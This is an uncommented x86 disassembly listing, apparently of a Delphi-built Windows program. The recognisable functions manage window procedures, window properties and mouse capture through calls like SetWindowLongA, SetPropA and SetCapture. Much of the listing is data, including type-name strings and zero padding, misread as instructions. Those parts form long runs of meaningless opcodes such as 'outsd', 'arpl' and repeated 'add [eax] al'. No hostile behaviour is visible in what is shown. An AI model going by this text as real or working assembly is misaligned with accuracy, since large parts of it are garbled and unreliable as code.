jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add ah dh
adc [ eax ] al
call 0xffffffffc04335e9
add [ ebx ] al
add [ eax ] dl
inc eax
add ah bh
inc edx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
nop
jmp 0x107ef2bf
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
call sub_4336bb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
aam 0xf3
inc edx
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
inc ebx
jpe r-xdata
jbe r-xdata
inc ebp
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x42f55cc0 ] cl
push edi
push 0x456c6565
jbe r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x42f4d4c0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
hlt
outsb
je r-xdata
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
outsb
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
push 0x6e490774
je r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bl
test [ edx ] r-xdata
pop esp
add [ eax ] eax
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
jo r-xdata
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
inc esp
hlt
jb r-xdata
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
inc ecx
add [ eax ] al
sub al 0x21
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
jbe r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
pop esp
cmc
inc edx
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
hlt
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ edx + 0x41 ] bh
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add [ ebp + ecx * 2 + 0x30880043 ] bl
inc eax
add [ eax + esi + 0x2b480040 ] ah
jo r-xdata
add [ ecx ] ch
inc ebp
js r-xdata
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
outsb
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
lea eax [ eax ]
je r-xdata
jbe r-xdata
add dh bl
clc
inc edx
add [ ecx + eax ] bl
outsb
je r-xdata
add al 0x8
push es
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x98bffc0 ] cl
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
fmul [ 0x103c0041 ]
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
add [ eax ] al
adc [ eax ] al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ edx ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb dh bh
inc edx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
dec ebp
outsd
jne r-xdata
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
fmul [ 0x41 ]
add [ eax ] al
add [ eax ] dl
inc eax
add al dl
cmc
inc edx
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
adc [ eax ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
inc ebx
add [ edx + ebx * 2 + 0x43 ] bh
add [ esi + ecx * 2 + 0x43 ] dh
add [ esi + edi + 0x41 ] bl
add [ edx + ebx * 2 + 0x43 ] al
add [ eax + 0x2e ] al
inc ebx
add [ ebp + ebp + 0x37580043 ] ch
inc ebx
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx + 0x2a700041 ] bl
inc ebx
add [ ecx + ecx * 2 ] cl
inc ebx
add [ eax ] cl
dec ecx
inc ebx
add al bl
dec ecx
inc ebx
add [ esp + ebp + 0x33f80043 ] dh
inc ebx
add [ ebx + esi + 0x43 ] bl
add [ esp + edi + 0x2bfc0043 ] al
inc ebx
add [ eax ] al
sub al 0x43
add [ esp + ebx * 2 ] dl
inc ebx
add [ eax + 0x5c ] al
inc ebx
add [ eax + 0x37 ] al
inc ebx
add [ eax + 0x2d ] bh
inc ebx
add ah cl
cmp [ ebx ] al
inc esp
cmp [ ebx ] al
pop eax
cmp eax [ ebx ]
add al 0x3a
inc ebx
add [ eax ] cl
dec esp
inc ebx
add ah al
pop esp
inc ebx
add [ esi + edi + 0x43 ] al
add [ eax + 0x2c00433e ] bh
das
inc ebx
add [ eax + 0xe00433e ] bl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x800040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
add [ eax + 0x2b ] cl
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_42fa3c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bl bh
inc edx
add [ eax + eax ] ah
add [ eax ] al
clc
0x33200042 0x40
sub_42fa68
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x5c97ffc0 ] ah
inc ecx
add [ eax + 0x5e ] ch
inc ebx
add [ ebx + 0x28d40041 ] bl
inc ebx
add al dl
mov [ 0x29800041 ] eax
inc ebx
add [ eax ] ah
mov [ 0xffffffffa3b40041 ] eax
inc ecx
add [ eax ] cl
movsb [ edi ] [ esi ]
inc ecx
add al al
daa
inc ebx
add al dh
std
inc ebx
add [ eax + ebp ] dh
inc ebx
add [ eax ] bl
inc [ ebx ]
mov [ esi + 0x43 ] ds
add [ ecx + ebp + 0x28680043 ] ch
inc ebx
add [ eax - 0x2 ] ch
inc ebx
add [ esi + edi * 8 + 0x43 ] bh
add [ eax - 0x5bffbcd8 ] ah
inc [ ebx ]
cld
sub [ ebx ] al
lodsb [ esi ]
inc [ ebx ]
sbb al 0x29
inc ebx
add [ esi + edi * 8 + 0x5e940043 ] dh
inc ebx
add [ eax ] dl
sub al [ ebx ]
push eax
sub al [ ebx ]
cmp al 0x29
inc ebx
add al cl
inc [ ebx ]
int3
sub_42fd10
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and dh bh
inc edx
add ah al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh dh
inc edx
add [ edx + 0x4004300 ] dh
add al [ eax ]
add [ eax ] ch
test [ edx ] 0x7c
mov [ 0x332c0041 ] al
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add al ch
jl r-xdata
inc ebx
add [ esp + ebp * 4 ] al
inc ebx
add [ esp + ebp - 0x5de7ffbd ] dh
inc ebx
add [ eax ] bh
mov [ 0xffffffff9f500043 ] al
inc ebx
add ah bh
sub eax [ ebx ]
add [ ebx + eax * 2 ] ch
add [ esp + ebx * 2 ] dl
inc ebx
add [ eax + 0x5c ] al
inc ebx
add [ eax + 0x37 ] al
inc ebx
add [ eax + 0x2d ] bh
inc ebx
add ah cl
cmp [ ebx ] al
inc esp
cmp [ ebx ] al
pop eax
cmp eax [ ebx ]
add al 0x3a
inc ebx
add [ ebx + edi * 2 + 0x5cc40043 ] al
inc ebx
add [ edi + ebx * 4 - 0x5f9fffbd ] ah
inc ebx
add [ ebx + ebx * 4 + 0x43 ] bl
add [ eax + 0x43 ] al
add ah bl
popad
inc ebx
add [ eax + 0x68 ] dh
inc ebx
add [ eax ] dl
jbe r-xdata
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
rcr [ edi + 0x43 ] 0x0
mov [ ebx + eax * 2 + 0x4374b000 ] ch
add [ esi + edi + 0x41 ] bl
add [ edx + ebx * 2 + 0x43 ] al
add [ eax + 0x2e ] al
inc ebx
add [ ecx + 0x43 ] ah
add [ eax + 0x37 ] bl
inc ebx
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx + 0x5e9c0041 ] bl
inc ebx
add [ edi - 0x5347ffbd ] bl
test al 0xfb
inc edx
add [ eax + 0x69000001 ] cl
add [ edi ] cl
add [ ecx ] dl
add ah bh
outsd
inc ebx
add al bh
jb r-xdata
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
imul eax [ eax ] 0x111000f
add [ eax ] ch
jno r-xdata
dec esi
add [ 0x15011400 ] dl
adc [ ecx ] eax
add [ eax - 0x53ffbc8a ] ch
jbe r-xdata
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
adc eax 0x2d003901
add [ ebx ] ch
add [ eax + eax ] ch
adc al 0x0
add [ esi ] ecx
adc eax 0x15011400
add [ ebp + esi * 2 + 0x43 ] ah
add [ esi * 2 - 0x5e7bffbd ] cl
inc ebx
add [ edi + edi * 2 + 0x43 ] dl
add [ eax - 0x4d ] bl
inc ebx
add [ eax ] al
sahf
inc ebx
add al dh
mov al [ 0xe0043 ]
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
fdivr st4
inc edx
add [ ecx + eax ] bh
add [ eax - 0x77ffbd05 ] ch
add [ eax ] eax
add [ ecx ] ch
lldt [ ecx ]
sub_4303c4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x4
inc ebx
add [ eax ] ch
add [ eax ] al
add [ eax + 0x20004010 ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_4304b4
xchg esp eax
add al 0x43
add [ esi - 0x57ffbcfc ] bl
add al 0x43
add [ ecx ] bl
add al 0x43
add [ ecx ] ah
add al 0x43
add [ ecx ] ch
add al 0x43
add [ ecx ] dh
add al 0x43
add [ esi ] bh
add al 0x43
add [ ebx + 0x4 ] cl
inc ebx
add [ eax + 0x4 ] bl
inc ebx
add [ ebp + 0x4 ] ah
inc ebx
add [ edx + 0x4 ] dh
inc ebx
add [ edi + 0x4 ] bh
inc ebx
add [ esp + eax + 0x10043 ] cl
add [ eax ] al
jns r-xdata
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4b4e870 ] eax
inc ebx
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax + 0x5 ] bl
inc ebx
add ah ch
add al 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + eax + 0x780043 ] al
add [ eax ] al
xchg esp eax
adc [ eax ] eax
and [ ebx ] dh
inc eax
add [ eax + 0x55 ] ch
inc eax
add [ ebp + edx * 2 + 0x40 ] dh
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
test [ ebp + 0x40 ] dl
add [ eax + esi - 0x3a17ffc0 ] ah
inc ebx
add [ esi + eax * 8 ] bh
inc ebx
add [ edi + eax * 8 - 0x383bffbd ] dh
inc ebx
add [ edi + ecx * 8 - 0x2d93ffbd ] al
inc ebx
add [ esp + edx * 8 - 0x294fffbd ] ch
inc ebx
add [ ebx + ebx * 8 - 0x2697ffbd ] dh
inc ebx
add [ eax + 0x480043c4 ] al
rol [ ebx ] cl
or [ esp + eax * 2 + 0x6f ] edx
arpl [ ebx + 0x54 ] bp
jb r-xdata
add [ eax ] al
cmp [ edi ] al
mov eax eax
fadd [ 0x43 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fadd [ 0x280043 ]
add [ eax ] al
mov al [ 0x20004010 ]
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x1763ffc0 ] ah
inc ebx
add [ esi ] al
push esp
dec ebp
outsd
jne r-xdata
inc ebx
add [ esp + ebp * 4 ] al
inc ebx
add [ esp + ebp - 0x5de7ffbd ] dh
inc ebx
add [ eax ] bh
mov [ 0xffffffff9f500043 ] al
inc ebx
add ah bh
sub eax [ ebx ]
add [ ebx + eax * 2 ] ch
add [ esp + ebx * 2 ] dl
inc ebx
add [ eax + 0x5c ] al
inc ebx
add [ eax + 0x37 ] al
inc ebx
add [ eax + 0x2d ] bh
inc ebx
add ah cl
cmp [ ebx ] al
inc esp
cmp [ ebx ] al
pop eax
cmp eax [ ebx ]
add al 0x3a
inc ebx
add [ ebx + edi * 2 + 0x5cc40043 ] al
inc ebx
add [ edi + ebx * 4 - 0x5f9fffbd ] ah
inc ebx
add [ ebx + ebx * 4 + 0x43 ] bl
add [ eax + 0x43 ] al
add ah bl
popad
inc ebx
add [ eax + 0x68 ] dh
inc ebx
add [ eax ] dl
jbe r-xdata
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
rcr [ edi + 0x43 ] 0x0
mov [ ebx + eax * 2 + 0x4374b000 ] ch
add [ esi + edi + 0x41 ] bl
add [ edx + ebx * 2 + 0x43 ] al
add [ eax + 0x2e ] al
inc ebx
add [ ecx + 0x43 ] ah
add [ eax + 0x37 ] bl
inc ebx
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx + 0x5e9c0041 ] bl
inc ebx
add [ edi - 0x5347ffbd ] bl
lahf
inc ecx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
pop es
inc ebx
add [ eax ] cl
add al [ eax ]
add [ edi * 8 - 0x5d83ffbe ] cl
inc ecx
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add al ch
jl r-xdata
nop
xor [ esi ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
pop es
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
add ah bh
outsd
inc ebx
add al bh
jb r-xdata
cmp [ ebp - 0x3 ] bl
[ ecx + 0x40000000 ]
je r-xdata
inc eax
add [ ecx + ebp ] ch
add [ eax ] ch
jno r-xdata
push eax
call GetWindowLongA
test eax 0x40000000
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
inc eax
add [ edi + ebp * 8 + 0x292c0043 ] ch
add [ eax - 0x53ffbc8a ] ch
jbe r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
je r-xdata
insb
nop
cmp [ edi ] al
inc ebx
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
inc eax
add [ edx ] dl
push esp
inc ebx
jne r-xdata
add [ ebp + esi * 2 + 0x43 ] ah
add [ esi * 2 - 0x5e7bffbd ] cl
inc ebx
add [ edi + edi * 2 + 0x43 ] dl
add [ eax - 0x4d ] bl
inc ebx
add [ eax ] al
sahf
inc ebx
add al dh
mov al [ 0x292c0043 ]
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
inc ebp
or [ eax + 0x6a ] dl
hlt
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
or [ eax - 0x18 ] dl
sti
pop esi
std
jmp [ ecx + rw-data ]
insb
xor [ esi ] al
inc ebx
add al al
add [ ebx ] al
or eax [ eax ]
or [ ebx + 0x6f ] al
outsb
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
outsd
insb
jae r-xdata
add [ ebp - 0x74aaffc0 ] cl
in al dx
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
sub_43081c
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_430850
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_40436c
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_43081c
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_4308ac
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_430a90
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40be98
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_4043cc
mov eax edi
mov edx esi
call sub_403f00
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_430ad4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40be98
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_4043cc
mov eax edi
mov edx esi
call sub_403f00
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_430b40
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
jne r-xdata
mov eax ebx
call sub_43a170
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_430b88
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x36e40040 ] ah
inc ecx
add [ eax - 0x37ffbec8 ] cl
cmp al [ ecx ]
movsb [ edi ] [ esi ]
or al 0x43
add [ edi + esi + 0x54090041 ] dh
push ebx
imul esi [ ebp + 0x4c ] 0x8b747369
rcl [ ebx + 0x56 ] 0x57
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
inc ebx
add [ eax ] dl
add [ eax ] al
add ah ah
adc eax [ ecx ]
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_413860
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_430bec
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_413860
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_430c20
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43a170
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_430c48
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026cc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_430c20
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_430bec
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_413704
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4138dc
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_430ca4
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_413738
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413860
mov edx 0x8
call sub_4026ec
inc esi
dec ebx
jne r-xdata
sub_430cd8
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_413860
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_430bec
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_430d3c
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_430d9c
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403040
mov edx esp
mov eax esi
call sub_404110
